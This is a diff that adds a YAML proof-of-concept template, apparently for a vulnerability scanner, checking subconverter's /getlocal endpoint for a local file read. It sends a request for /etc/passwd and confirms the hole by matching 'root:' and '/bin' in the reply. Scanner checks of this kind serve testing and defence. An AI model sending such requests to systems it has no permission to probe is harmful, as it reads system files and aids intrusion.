@@ -1,0 +1,16 @@
+id: poc-yaml-subconverter-getlocal-file-read
+info:
+  name: subconverter /getlocal 本地文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: subconverter
+requests:
+- method: GET
+  path: /getlocal?path=/etc/passwd
+  expression: 'status_code == 200 && contains(body, "root:") && contains(body, "/bin")
+    && !contains(body, "<")
+
+    '
+variables: {}
+transport: http
